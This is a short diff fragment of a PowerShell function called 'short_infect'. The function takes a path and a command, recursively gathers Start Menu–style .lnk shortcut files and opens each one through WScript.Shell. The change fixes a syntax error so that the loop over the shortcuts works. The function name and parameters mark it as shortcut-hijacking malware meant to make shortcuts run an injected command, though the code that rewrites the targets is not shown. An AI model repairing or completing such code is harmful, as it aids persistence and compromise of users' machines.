@@ -1,7 +1,7 @@
 function short_infect{ 
     param($PathShortcut,$command);
 $StartMenu = Get-ChildItem $PathShortcut -Recurse -Include *.lnk;
-ForEach($ShortCut in $StartMenu);
+ForEach($ShortCut in $StartMenu)
 {
     $sh = New-Object -ComObject WScript.Shell;
     $lnk = $sh.CreateShortcut($ShortCut.FullName);
